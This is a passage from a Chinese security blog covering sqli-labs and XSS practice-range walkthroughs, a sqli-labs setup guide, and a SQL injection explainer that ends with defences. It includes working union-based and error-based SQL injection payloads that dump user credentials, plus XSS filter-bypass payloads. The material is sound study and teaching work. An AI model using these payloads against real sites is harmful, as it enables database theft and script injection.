&#39;security&#39;;#123</code></p><p>URL编码<code>%2D2%27%20union%20select%201%2C%20GROUP%5FCONCAT%28TABLE%5FNAME%29%2C%203%20from%20information%5Fschema%2ECOLUMNS%20where%20TABLE%5FSCHEMA%20%3D%20%27security%27%3B%23123</code></p><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/sqli-labs%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/14.png" alt="这里有一个图片"></p><h3 id="爆出所有字段名"><a href="#爆出所有字段名" class="headerlink" title="爆出所有字段名"></a>爆出所有字段名</h3><p>爆出users表中的所有字段名</p><p><code>-2&#39; union select 1, GROUP_CONCAT(distinct COLUMN_NAME), 3 from information_schema.COLUMNS where TABLE_SCHEMA = &#39;security&#39; and TABLE_NAME = &#39;users&#39;;#123</code></p><p>URL编码<code>%2D2%27%20union%20select%201%2C%20GROUP%5FCONCAT%28distinct%20COLUMN%5FNAME%29%2C%203%20from%20information%5Fschema%2ECOLUMNS%20where%20TABLE%5FSCHEMA%20%3D%20%27security%27%20and%20TABLE%5FNAME%20%3D%20%27users%27%3B%23123</code></p><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/sqli-labs%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/15.png" alt="这里有一个图片"></p><h3 id="爆出所有用户名密码"><a href="#爆出所有用户名密码" class="headerlink" title="爆出所有用户名密码"></a>爆出所有用户名密码</h3><p>爆出users表中的所有用户名密码</p><p><code>-2&#39; union select 1, GROUP_CONCAT(username), GROUP_CONCAT(password) from security.users;#123</code></p><p>URL编码<code>%2D2%27%20union%20select%201%2C%20GROUP%5FCONCAT%28username%29%2C%20GROUP%5FCONCAT%28password%29%20from%20security%2Eusers%3B%23123</code></p><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/sqli-labs%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/16.png" alt="这里有一个图片"></p><p>以这种方式，整个数据库的所有数据都能被导出</p><h2 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h2><p>输入1没问题，输入<code>1%27</code>报错</p><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/sqli-labs%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/17.png" alt="这里有一个图片"></p><p>说明这次后端的SQL语句没有加单引号</p><p>其它步骤跟第一关一致，只是要去掉-2后面的单引号</p><p><code>-2 union select 1, GROUP_CONCAT(username), GROUP_CONCAT(password) from security.users;#123</code></p><p>URL编码<code>%2D2%20union%20select%201%2C%20GROUP%5FCONCAT%28username%29%2C%20GROUP%5FCONCAT%28password%29%20from%20security%2Eusers%3B%23123</code></p><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/sqli-labs%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/18.png" alt="这里有一个图片"></p><h2 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h2><p>输入<code>1%27</code>报错如下</p><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/sqli-labs%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/19.png" alt="这里有一个图片"></p><p>说明后端的SQL语句是这样的<code>... id = (&#39;$id&#39;) ...</code></p><p>那只用将<code>-2&#39;</code>替换为<code>-2&#39;)</code>，其它步骤跟第一关一致</p><p><code>-2&#39;) union select 1, GROUP_CONCAT(username), GROUP_CONCAT(password) from security.users;#123</code></p><p>URL编码<code>%2D2%27%29%20union%20select%201%2C%20GROUP%5FCONCAT%28username%29%2C%20GROUP%5FCONCAT%28password%29%20from%20security%2Eusers%3B%23123</code></p><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/sqli-labs%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/20.png" alt="这里有一个图片"></p><h2 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h2><p>输入<code>1%22</code>报错如下</p><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/sqli-labs%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/21.png" alt="这里有一个图片"></p><p>说明后端的SQL语句是<code>... id = (&quot;$id&quot;) limit 0,1</code></p><p>那只用将<code>-2&#39;</code>替换为<code>-2&quot;)</code>，其它步骤跟第一关一致</p><p><code>-2&quot;) union select 1, GROUP_CONCAT(username), GROUP_CONCAT(password) from security.users;#123</code></p><p>URL编码<code>%2D2%22%29%20union%20select%201%2C%20GROUP%5FCONCAT%28username%29%2C%20GROUP%5FCONCAT%28password%29%20from%20security%2Eusers%3B%23123</code></p><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/sqli-labs%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/22.png" alt="这里有一个图片"></p><h2 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h2><p>输入<code>1</code>不报错，但只显示<code>you are in</code></p><p>输入<code>1%27</code>报错，得出后端的SQL语句为<code>... id = &#39;$id&#39; limit 0,1</code></p><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/sqli-labs%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/23.png" alt="这里有一个图片"></p><p>但因为成功查询只会给出固定的<code>you are in</code>，所以只能在报错信息上做文章</p><p>使用updatexml函数，构造<code>-2&#39; union select 1, updatexml(&#39;&lt;a&gt;&lt;b&gt;123&lt;/a&gt;&lt;/b&gt;&#39;, CONCAT(&#39;!&#39;, (select GROUP_CONCAT(distinct TABLE_SCHEMA) from information_schema.COLUMNS), &#39;!&#39;), &#39;456&#39;), 3;#123</code></p><p>URL编码<code>%2D2%27%20union%20select%201%2C%20updatexml%28%27%3Ca%3E%3Cb%3E123%3C%2Fa%3E%3C%2Fb%3E%27%2C%20CONCAT%28%27%21%27%2C%20%28select%20GROUP%5FCONCAT%28distinct%20TABLE%5FSCHEMA%29%20from%20information%5Fschema%2ECOLUMNS%29%2C%20%27%21%27%29%2C%20%27456%27%29%2C%203%3B%23123</code></p><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/sqli-labs%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/24.png" alt="这里有一个图片"></p><p>因为此错误的细节只显示32字节，于是数据库名显示不全，就要用到<code>not in (xxx)</code></p><p><code>-2&#39; union select 1, updatexml(&#39;&lt;a&gt;&lt;b&gt;123&lt;/a&gt;&lt;/b&gt;&#39;, CONCAT(&#39;!&#39;, (select GROUP_CONCAT(distinct TABLE_SCHEMA) from information_schema.COLUMNS where TABLE_SCHEMA not in (&#39;challenges&#39;, &#39;information_schema&#39;)), &#39;!&#39;), &#39;456&#39;), 3;#123</code></p><p>URL编码<code>%2D2%27%20union%20select%201%2C%20updatexml%28%27%3Ca%3E%3Cb%3E123%3C%2Fa%3E%3C%2Fb%3E%27%2C%20CONCAT%28%27%21%27%2C%20%28select%20GROUP%5FCONCAT%28distinct%20TABLE%5FSCHEMA%29%20from%20information%5Fschema%2ECOLUMNS%20where%20TABLE%5FSCHEMA%20not%20in%20%28%27challenges%27%2C%20%27information%5Fschema%27%29%29%2C%20%27%21%27%29%2C%20%27456%27%29%2C%203%3B%23123</code></p><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/sqli-labs%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/25.png" alt="这里有一个图片"></p><p>此处省略中间过程</p><p><code>-2&#39; union select 1, updatexml(&#39;&lt;a&gt;&lt;b&gt;123&lt;/a&gt;&lt;/b&gt;&#39;, CONCAT(&#39;!&#39;, (select CONCAT(username, password) from security.users where id = 1), &#39;!&#39;), &#39;456&#39;), 3;#123</code></p><p>URL编码<code>%2D2%27%20union%20select%201%2C%20updatexml%28%27%3Ca%3E%3Cb%3E123%3C%2Fa%3E%3C%2Fb%3E%27%2C%20CONCAT%28%27%21%27%2C%20%28select%20CONCAT%28username%2C%20password%29%20from%20security%2Eusers%20where%20id%20%3D%201%29%2C%20%27%21%27%29%2C%20%27456%27%29%2C%203%3B%23123</code></p><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/sqli-labs%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/26.png" alt="这里有一个图片"></p><p>得到id为1的用户名密码</p><p>借助这种方式，可爆出数据库的所有数据</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ubuntu下sqli-labs靶场搭建</title>
    <link href="/2022/11/09/ubuntu%E4%B8%8Bsqli-labs%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA/"/>
    <url>/2022/11/09/ubuntu%E4%B8%8Bsqli-labs%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<p>靶场搭建在ubuntu20.04下</p><p>sqli-labs项目地址 <a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a></p><p>因sqli-labs只支持PHP5，而我使用的ubuntu20.04只支持PHP7以上版本，所以我使用了另一个项目sqli-labs-php7 <a href="https://github.com/skyblueee/sqli-labs-php7">https://github.com/skyblueee/sqli-labs-php7</a></p><h2 id="克隆项目"><a href="#克隆项目" class="headerlink" title="克隆项目"></a>克隆项目</h2><p>克隆项目到目录&#x2F;var&#x2F;www&#x2F;html下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> git <span class="hljs-built_in">clone</span> https://github.com/skyblueee/sqli-labs-php7 /var/www/html<br></code></pre></td></tr></table></figure><h2 id="安装软件"><a href="#安装软件" class="headerlink" title="安装软件"></a>安装软件</h2><p>通过apt安装需要的软件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt install php php-fpm php-mysql mysql-server nginx<br></code></pre></td></tr></table></figure><p>注意，一定要安装php-mysql</p><p>启动相关的服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> systemctl restart php7.4-fpm mysql nginx<br></code></pre></td></tr></table></figure><h2 id="配置MySQL-Server"><a href="#配置MySQL-Server" class="headerlink" title="配置MySQL Server"></a>配置MySQL Server</h2><p>以root身份登录MySQL Server</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> mysql<br></code></pre></td></tr></table></figure><p>创建名为sqli_labs_php7密码为sqli_labs_php7_test的用户，并为用户<code>sqli_labs@127.0.0.1</code>赋予除grant权限外的所有权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">create user &#x27;sqli_labs_php7&#x27;@&#x27;127.0.0.1&#x27; identified by &#x27;sqli_labs_php7_test&#x27;;<br>grant all privileges on *.* to &#x27;sqli_labs_php7&#x27;@&#x27;127.0.0.1&#x27;;<br></code></pre></td></tr></table></figure><h2 id="配置nginx"><a href="#配置nginx" class="headerlink" title="配置nginx"></a>配置nginx</h2><p>删除文件&#x2F;etc&#x2F;nginx&#x2F;sites-enabled&#x2F;default</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">rm</span> /etc/nginx/sites-enabled/default<br></code></pre></td></tr></table></figure><p>创建文件&#x2F;etc&#x2F;nginx&#x2F;sites-enabled&#x2F;sqli_labs_php7.conf，并写入如下内容</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br>    <span class="hljs-attribute">listen</span> <span class="hljs-number">8080</span> default_server;<br>    <span class="hljs-attribute">server_name</span> _;<br>    <span class="hljs-attribute">root</span> /var/www/html/sqli-labs-php7;<br>    <span class="hljs-attribute">index</span> index.html index.php;<br>    <span class="hljs-section">location</span> / &#123;<br>        <span class="hljs-attribute">try_files</span> <span class="hljs-variable">$uri</span> <span class="hljs-variable">$uri</span>/ =<span class="hljs-number">404</span>;<br>    &#125;<br>    <span class="hljs-section">location</span> <span class="hljs-regexp">~ \.php$</span> &#123;<br>        <span class="hljs-attribute">include</span> snippets/fastcgi-php.conf<br>        fastcgi_pass unix:/var/run/php/php7.4-fpm.sock;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>重启nginx</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> systemctl restart nginx<br></code></pre></td></tr></table></figure><h2 id="配置sqli-labs-php7"><a href="#配置sqli-labs-php7" class="headerlink" title="配置sqli-labs-php7"></a>配置sqli-labs-php7</h2><p>修改&#x2F;var&#x2F;www&#x2F;html&#x2F;sqli-labs-php7&#x2F;sql-connections&#x2F;db-creds.inc，将其中的<code>dbuser</code>和<code>dbpass</code>改为<code>sqli_labs_php7</code>和<code>sqli-labs_php7_test</code></p><h2 id="初始化数据库"><a href="#初始化数据库" class="headerlink" title="初始化数据库"></a>初始化数据库</h2><p>通过浏览器访问<code>http://你的虚拟机IP:8080/index.html</code></p><p>点击<code>Set/reset Database for labs</code>进行数据库初始化</p><p>至此，sqli-labs-php7靶场搭建完毕，enjoy~</p><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/ubuntu%E4%B8%8Bsqli-labs%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA/1.png" alt="这里有一个图片"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入原理浅析</title>
    <link href="/2022/11/02/SQL%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/"/>
    <url>/2022/11/02/SQL%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h2 id="一、序言"><a href="#一、序言" class="headerlink" title="一、序言"></a>一、序言</h2><p>我们通过一个实验来浅析SQL注入的原理，实验基于我编写的一个简单的书店系统，其已被我上传到了GitHub<br><a href="https://github.com/pasiphae321/BookstoreSystem">https://github.com/pasiphae321/BookstoreSystem</a><br>预览链接</p><h2 id="二、切换模式"><a href="#二、切换模式" class="headerlink" title="二、切换模式"></a>二、切换模式</h2><p>在search.php中存在两种模式，一种使用PDO的prepare、bindParam方法进行防范SQL注入(下图圈一)，另一种存在SQL注入漏洞(下图圈二)<br>我们切换到模式二<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/SQLInjection/1.png" alt="这里有一个图片"></p><h2 id="三、正式实验"><a href="#三、正式实验" class="headerlink" title="三、正式实验"></a>三、正式实验</h2><p>1.登录系统<br>以任何一个用户登录系统，访问书籍搜索页面<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/SQLInjection/2.png" alt="这里有一个图片"></p><p>2.进行正常搜索<br>由下面两图可以看到，正常搜索无论是否存在对应书籍都会有回显<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/SQLInjection/3.png" alt="这里有一个图片"><br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/SQLInjection/4.png" alt="这里有一个图片"></p><p>3.探测是否存在SQL注入漏洞<br>BookName这种一看在mysql中的字段类型就是字符串，那么其在后端对应的SQL语句应该就是</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">select</span> xxx <span class="hljs-keyword">from</span> xxx <span class="hljs-keyword">where</span> BookName = <span class="hljs-string">&#x27;后端所用语言的某个变量名&#x27;</span>;<br></code></pre></td></tr></table></figure><p>通过输入<code>1&#39;</code>，将SQL语句中的第一个<code>&#39;</code>与<code>1</code>后面的<code>&#39;</code>构成一对，那么其后的<code>&#39;;</code>就会造成SQL的语法错误，执行这个SQL语句MySQL就会报错，那么后端在得到报错后可能就不会设置回显或者设置不同的回显</p><p>由下图可以看到，因为MySQL的报错，后端返回了不同的回显，说明存在SQL注入漏洞<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/SQLInjection/5.png" alt="这里有一个图片"></p><p>4.探测数据库类型<br>常见数据库有MySQL、PostgreSQL、SQLServer、oracle，只有MySQL有##注释</p><p>尝试输入<code>&#39; ##</code>看数据库是否报错，由下图可以看到并未出现查询失败的回显，说明数据库并未报错，那么数据库就是MySQL<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/SQLInjection/6.png" alt="这里有一个图片"></p><p>关于其它三个数据库的区分，可以查阅网络上的资料</p><p>5.探测select的字段数量<br>虽然前端的表格只有两个字段，但是后端的SQL语句有可能select了不止两个字段，那么我们通过union select进行探测</p><p>输入<code>为什么&#39; union select 1,2;##</code>，可以看到回显有1和2，说明后端的SQL语句select了两个字段<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/SQLInjection/7.png" alt="这里有一个图片"></p><p>输入<code>为什么&#39; union select 1,2,3;##</code>，可以看到MySQL报错了，说明union前后的两个select的字段数量不一致，验证了后端的SQL语句确实select了两个字段<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/SQLInjection/8.png" alt="这里有一个图片"></p><p>6.获取MySQL中的所有数据<br>MySQL中有一个名为information_schema的库，库中有个名为COLUMNS的表，表中存在三个字段TABLE_SCHEMA、TABLE_NAME、COLUMN_NAME，分别表示库名、表名、列名，可通过此表查询整个MySQL的信息<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/SQLInjection/9.png" alt="这里有一个图片"></p><p>例如，查询整个MySQL的所有数据库名</p><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs q">为什么&#x27; <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> TABLE_SCHEMA, <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> information_schema.COLUMNS <span class="hljs-built_in">group</span> <span class="hljs-keyword">by</span> TABLE_SCHEMA;##<br></code></pre></td></tr></table></figure><p>可以看到查到了所有数据库名<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/SQLInjection/10.png" alt="这里有一个图片"></p><p>查询BookstoreSystem库的所有表名</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">为什么&#x27; union <span class="hljs-keyword">select</span> TABLE_NAME, <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> information_schema.COLUMNS <span class="hljs-keyword">where</span> TABLE_SCHEMA = <span class="hljs-string">&#x27;BookstoreSystem&#x27;</span><span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> TABLE_NAME;##<br></code></pre></td></tr></table></figure><p>可以看到，查出了所有的表名<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/SQLInjection/11.png" alt="这里有一个图片"></p><p>查询users表的所有字段名</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">为什么&#x27; union <span class="hljs-keyword">select</span> COLUMN_NAME, <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> information_schema.COLUMNS <span class="hljs-keyword">where</span> TABLE_SCHEMA = <span class="hljs-string">&#x27;BookstoreSystem&#x27;</span> <span class="hljs-keyword">and</span> TABLE_NAME = <span class="hljs-string">&#x27;users&#x27;</span>;##<br></code></pre></td></tr></table></figure><p>可以看到，查出了所有字段名<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/SQLInjection/12.png" alt="这里有一个图片"></p><p>查询username和password字段的所有值</p><figure class="highlight capnproto"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs capnproto">为什么&#x27; <span class="hljs-keyword">union</span> select username, password <span class="hljs-keyword">from</span> BookstoreSystem.users;<span class="hljs-comment">##</span><br></code></pre></td></tr></table></figure><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/SQLInjection/13.png" alt="这里有一个图片"></p><p>通过如上方式，可获取整个数据库的数据</p><h2 id="四、防范SQL注入的方法"><a href="#四、防范SQL注入的方法" class="headerlink" title="四、防范SQL注入的方法"></a>四、防范SQL注入的方法</h2><h3 id="1-参数化查询-parameterized-query"><a href="#1-参数化查询-parameterized-query" class="headerlink" title="1.参数化查询(parameterized query)"></a>1.参数化查询(parameterized query)</h3><p>通过将SQL的代码和数据相分离，例如使用PHP的PDO的prepare方法和bindParam方法，本实验使用的书店系统就采用的此方式</p><h3 id="2-使用ORM框架"><a href="#2-使用ORM框架" class="headerlink" title="2.使用ORM框架"></a>2.使用ORM框架</h3><p>ORM即Obejct Relationship Mapping对象关系映射，具体原理可查阅网络上的资料</p><h3 id="3-在后端进行关键字过滤"><a href="#3-在后端进行关键字过滤" class="headerlink" title="3.在后端进行关键字过滤"></a>3.在后端进行关键字过滤</h3><p>后端过滤掉能够引起SQL注入的关键字如<code>&#39;/##/;/--/union/select</code>等等，但这种方式会在一定程度上影响正常搜索</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>XSS靶场过关</title>
    <link href="/2022/08/29/XSS%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/"/>
    <url>/2022/08/29/XSS%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/</url>
    
    <content type="html"><![CDATA[<p>靶场网址 <a href="https://xss.tesla-space.com/">http://xss.tesla-space.com/</a></p><h2 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h2><p>get传参name值为test，回显有test，直接在URL栏将参数值修改为<code>&lt;script&gt;alert(12345);&lt;/script&gt;</code>(在URL栏输入还是在输入框输入都一样，但有细微差别)</p><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/XSS%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/1.png" alt="这里有一个图片"></p><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/XSS%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/2.png" alt="这里有一个图片"></p><p>过关</p><h2 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h2><p>感觉和第一关一样</p><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/XSS%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/3.png" alt="这里有一个图片"></p><p>直接在URL栏输入<code>&lt;script&gt;alert(123);&lt;/script&gt;</code>，发现行不通</p><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/XSS%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/4.png" alt="这里有一个图片"></p><p>&nbsp;</p><p>查看网页源码，发现虽然<code>没要找到xxx的结果</code>那里尖括号在服务器端被转义了，但是输入框那里的尖括号没有被转义。那么我们可以在输入框那里闭合input标签，直接在浏览器URL栏输入<code>&quot;&gt;&lt;script&gt;alert(123)&lt;/script&gt;</code></p><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/XSS%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/5.png" alt="这里有一个图片"></p><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/XSS%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/6.png" alt="这里有一个图片"></p><p>成功过关</p><h2 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h2><p>直接查看网页源码，可以看到参数名还是<code>keyword</code></p><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/XSS%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/7.png" alt="1"></p><p>&nbsp;</p><p>在URL栏输入<code>&lt;script&gt;alert(123)&lt;/script&gt;</code>测试下</p><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/XSS%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/8.png" alt="1"></p><p>没成功</p><p>&nbsp;</p><p>查看源码发现这关两个地方的<code>尖括号</code>都被转义了</p><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/XSS%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/9.png" alt="1"></p><p>&nbsp;</p><p>那就不用尖括号，输入<code>&#39; autofocus onblur=alert(); aaa=&#39;</code></p><p>只要点击页面非输入框的部分，就会调用alert函数</p><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/XSS%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/10.png" alt="1"></p><p>成功过关</p><p>但我还有一个未找到原因的问题，为什么输入<code>&#39; autofocus onfocus=alert(); aaa=&#39;</code>会一直循环调用alert</p><h2 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h2><p>查看源码</p><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/XSS%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/11.png" alt="1"></p><p>&nbsp;</p><p>输入<code>&quot; autofocus onblur=alert(); aaa=&quot;</code>测试下</p><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/XSS%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/12.png" alt="【这里有一个图片"></p><p>成功过关，当然也要先点击下非输入框的部分</p><h2 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h2><p>查看源码</p><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/XSS%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/13.png" alt="1"></p><p>又变成了<code>双引号</code></p><p>&nbsp;</p><p>测试下<code>&quot; autofocus onfocus=alert(); aaa=&quot;</code></p><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/XSS%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/14.png" alt="1"></p><p>发现不行，后端把input标签位置的<code>on</code>给替换为了<code>o_n</code></p><p>&nbsp;</p><p>那再测试下<code>&lt;script&gt;alert();&lt;/script&gt;</code>看下过滤了尖括号没有</p><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/XSS%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/15.png" alt="这里有一个图片"></p><p>h2标签处过滤了，但input标签处没过滤，但过滤了script</p><p>&nbsp;</p><p>那直接基于input标签输入<code>&quot;&gt; &lt;a href=javascript:alert();&gt;111&lt;/a&gt;</code>，并点击链接</p><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/XSS%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/16.png" alt="这里有一个图片"></p><p>成功过关</p><h2 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h2><p>查看源码</p><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/XSS%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/17.png" alt="1"></p><p>&nbsp;</p><p>先测试下<code>&quot;&gt;&lt;script&gt;alert(123);&lt;/script&gt;&lt;img src=&quot;</code>，没能成功，查看下源码</p><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/XSS%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/18.png" alt="这里有一个图片"></p><p>可以看到，h2标签处后端将<code>&quot;、&lt;、&gt;</code>转义为了HTML实体，input标签处没有转义<code>&quot;、&lt;、&gt;</code>，但是将<code>script</code>替换为了<code>scr_ipt</code>，将<code>src</code>转换为了<code>sr_c</code></p><p>但为什么<code>&lt;/script&gt;</code>中的<code>script</code>没有替换为<code>scr_ipt</code>呢？说明后端的替换规则为下面两种之一</p><ul><li><p><code>&lt;script</code>替换为<code>&lt;scr_ipt</code></p></li><li><p><code>&lt;script&gt;</code>替换为<code>&lt;scr_ipt&gt;</code></p></li></ul><p>最终测试发现为第一种</p><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/XSS%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/19.png" alt="1"></p><p>&nbsp;</p><p>这里利用浏览器的一个特性，DOM树生成过程中对HTML文件中的标签和属性名的大小写不敏感，但后端语言肯定对大小写是敏感的</p><p>我们测试下后端在替换时会不会大小写敏感</p><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/XSS%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/20.png" alt="1"></p><p>看来是大小写敏感的</p><p>&nbsp;</p><p>直接<code>&quot;&gt;&lt;sCRipt&gt;alert();&lt;script&gt;&lt;img src=&quot;</code></p><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/XSS%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/21.png" alt="这里有一个图片"></p><p>成功过关</p><h2 id="第七关"><a href="#第七关" class="headerlink" title="第七关"></a>第七关</h2><p>查看源码</p><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/XSS%E9%9D%B6%E5%9C%BA%E8%BF%87%E5%85%B3/22.png" alt="1"></p><p>&nbsp;</p><p>测试下<code>&quot;&gt;&lt;script&gt;alert(123);&lt;/script&gt;&lt;img src=&quot;</code></p><p><img 